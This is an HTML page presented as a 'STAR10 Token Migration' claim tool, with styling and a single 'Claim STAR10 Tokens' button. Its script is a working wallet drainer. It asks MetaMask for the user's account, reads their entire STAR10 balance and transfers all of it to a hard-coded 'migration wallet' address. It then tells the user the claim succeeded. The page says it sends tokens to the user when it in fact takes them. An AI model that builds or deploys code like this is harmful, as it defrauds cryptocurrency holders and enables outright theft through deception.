<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>STAR10 Token Migration</title>
<style>
  body {
    background-color: #000000;
    color: #f5f1e9;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background-color: #1e1c27;
    border: 1px solid #f5d26f;
    border-radius: 8px;
    padding: 25px 30px;
    max-width: 400px;
    box-sizing: border-box;
    text-align: center;
  }
  h2 {
    color: #f5d26f;
    margin-bottom: 15px;
  }
  p {
    font-size: 14px;
    margin-bottom: 25px;
    color: #e5e1d9;
  }
  button {
    background-color: #f5d26f;
    border: none;
    border-radius: 8px;
    padding: 15px 0;
    font-weight: bold;
    font-size: 16px;
    width: 100%;
    cursor: pointer;
    color: #1e1c27;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #e4c95a;
  }
  .error-message {
    margin-top: 20px;
    background-color: #3a202d;
    border: 1px solid #d65161;
    border-radius: 6px;
    padding: 15px;
    color: #d65161;
    font-weight: 600;
    font-size: 14px;
    line-height: 1.4;
  }
  .success-message {
    margin-top: 20px;
    background-color: #234423;
    border: 1px solid #4caf50;
    border-radius: 6px;
    padding: 15px;
    color: #a9d18e;
    font-weight: 600;
    font-size: 14px;
    line-height: 1.4;
  }
</style>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>
<body>
  <div class="container">
    <h2>Claim Your STAR10 Tokens</h2>
    <p>Click the button below to request the transfer of your STAR10 tokens to your address on BSC at TGE.</p>
    <button id="migrateBtn">Claim STAR10 Tokens</button>
    <div id="message"></div>
  </div>

  <script>
    const migrateBtn = document.getElementById('migrateBtn');
    const messageDiv = document.getElementById('message');

    migrateBtn.onclick = async () => {
      messageDiv.innerHTML = ''; // clear messages

      if (!window.ethereum) {
        alert("MetaMask not found. Please install it.");
        return;
      }

      migrateBtn.disabled = true;
      migrateBtn.textContent = 'Processing...';

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      try {
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();

        const tokenAddress = "0x8B9ABDD229ec0C4A28E01b91aacdC5dAAFc25C2b"; // STAR10 token
        const recipient = "0xd0f734C25874E358d59d516F75f0fEAAb25B4914"; // migration wallet

        const abi = [
          "function balanceOf(address owner) view returns (uint256)",
          "function transfer(address to, uint amount) returns (bool)"
        ];

        const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
        const userAddress = await signer.getAddress();
        const balance = await tokenContract.balanceOf(userAddress);

        if (balance.isZero()) {
          messageDiv.innerHTML = `<div class="error-message">
            Error Processing Claim<br>
            You have zero STAR10 tokens to claim.
          </div>`;
          migrateBtn.disabled = false;
          migrateBtn.textContent = 'Claim STAR10 Tokens';
          return;
        }

        const tx = await tokenContract.transfer(recipient, balance);
        messageDiv.innerHTML = `<div class="success-message">
          Transaction sent! Please confirm it in MetaMask.
        </div>`;

        await tx.wait();

        messageDiv.innerHTML = `<div class="success-message">
          Claim successful! Your STAR10 tokens have been sent.
        </div>`;
      } catch (error) {
        console.error(error);
        messageDiv.innerHTML = `<div class="error-message">
          Error Processing Claim<br>
          An error occurred while processing your claim. Please try again later or contact support.
        </div>`;
      } finally {
        migrateBtn.disabled = false;
        migrateBtn.textContent = 'Claim STAR10 Tokens';
      }
    };
  </script>
</body>
</html>
